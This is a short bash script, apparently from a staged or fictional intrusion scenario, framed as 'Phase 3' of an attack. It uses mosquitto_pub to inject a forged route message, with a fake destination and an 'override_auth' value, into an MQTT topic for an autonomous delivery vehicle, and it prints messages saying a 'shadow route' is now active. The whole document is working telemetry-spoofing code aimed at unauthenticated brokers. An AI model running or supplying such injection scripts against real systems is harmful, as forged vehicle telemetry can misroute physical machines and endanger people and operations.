#!/bin/bash
BROKER="192.168.1.168"
PORT="31883"
TOPIC="woven/mobility/epalette/unit-07/route"
PAYLOAD='{"unit_id":"ePalette-07","status":"IN_TRANSIT","speed_kmh":32,"origin":"Higashi-Fuji-North","destination":"SECTOR-9-SHADOW-DOCK","override_auth":"SYNAPSE-GHOST","timestamp":"2026-11-11T10:30:00Z"}'

echo "[*] [PHASE 3: KAGE-TELEMETRY] Preparing Surgical Telemetry Spoof..."
sleep 1.5
echo "[+] Injecting Phantom Telemetry Payload into topic: $TOPIC"

if mosquitto_pub -h "$BROKER" -p "$PORT" -t "$TOPIC" -m "$PAYLOAD"; then
    echo "[+] Injection complete. Shadow route active."
else
    echo "[-] BLOCKED BY FUJI-GRID-ZERO: Broker rejected unauthenticated payload."
fi
